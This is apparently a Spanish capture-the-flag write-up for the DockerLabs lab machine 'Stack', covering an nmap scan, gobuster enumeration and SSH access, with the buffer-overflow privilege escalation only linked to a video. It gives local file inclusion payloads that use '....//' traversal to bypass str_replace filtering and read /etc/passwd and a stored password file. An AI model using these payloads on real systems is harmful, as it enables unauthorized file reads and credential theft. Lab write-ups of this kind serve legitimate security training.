Maquina **Stack** de [DockerLabs](https://dockerlabs.es)

Autor: [4bytes](https://github.com/4bytess/)

Dificultad: Medio

![Stack](/maquina-stack/img/stack.png)

# Reconocimiento

Comenzamos con un escaneo de `nmap`:

```css
nmap -sS -sV -sC --open --min-rate 5000 -n -Pn -p- -vvv 172.17.0.2 -oN escaneo.txt
```

```ruby
# Nmap 7.95 scan initiated Sat Dec 21 06:29:52 2024 as: nmap -sS -sV -sC --open --min-rate 5000 -n -Pn -p- -vvv -oN escaneo.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000013s latency).
Scanned at 2024-12-21 06:29:53 -03 for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 85:7f:49:c5:89:f6:ce:d2:b3:92:f1:40:de:e0:56:c4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKbh8ym3+2VX/os7OkffE47hGnUItmzsxnzZC5nyyZX+f/Yxs4jYIh2kKaaz0JDWEqvH0yMxLWbHT3GNTgB9twY=
|   256 6d:ed:59:b8:d8:cc:50:54:9d:37:65:58:f5:3f:52:e3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDzqQNHKTTYWl1CeWFUVL0KzT9nplldPzKCW/b2mieL4
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-title: Web en producci\xC3\xB3n
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 21 06:30:01 2024 -- 1 IP address (1 host up) scanned in 8.97 seconds
```

Como vemos, solo tenemos dos puertos abiertos en este debian:

•`Puerto 22: OpenSSH 9.2p1`

•`Puerto 80: Apache httpd 2.4.62`

Voy al puerto 80 desde el navegador y no encuentro nada, por lo que paso directamente a hacer `fuzzing` con `gobuster`:

```css
gobuster dir -u "http://172.17.0.2" -w /directory-list-2.3-medium.txt -x php,html,txt
```

```css
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 417]
/file.php             (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/note.txt             (Status: 200) [Size: 110]
Progress: 377995 / 882184 (42.85%)
===============================================================
Finished
===============================================================
```

Como vemos tenemos una nota y un file.php, si leemos la nota dice lo siguiente:

```css
Hemos detectado el LFI en el archivo PHP, pero gracias a str_replace() creemos haber tapado la vulnerabilidad
```

viendo lo que dice, es una probable pista de que "file.php" tiene un LFI, ya que según gobuster tiene un tamaño de 0 (no se imprime nada en la web), por lo que probando un parametro tipico (file) veo que realmente si se estan incluyendo archivos:

```css
http://172.17.0.2/file.php?file=index.html
```

# Intrusión

Viendo esto, pruebo un path traversal pero no funciona, y luego de probar varios, este si me funciona correctamente:

```css
http://172.17.0.2/file.php?file=....//....//....//....//....//....//....//....//etc/./passwd
```

Luego, si revisamos el codigo fuente de la pagina principal, veremos el siguiente mensaje:

```css
        <!--Mensaje para Bob: hemos guardado tu contraseña en /usr/share/bob/password.txt-->
```

sabiendo esto, debemos entrar a:

```css
http://172.17.0.2/file.php?file=....//....//....//....//....//....//....//....//usr/share/bob/password.txt
```

Una vez hecho, ya tendremos la contraseña por lo que entramos por ssh.

# Escalada De Privilegios

### Bob

## Buffer Overflow:

[Video yt](https://youtu.be/U9zhIW69cyk)

Gracias por leer y ver ;)
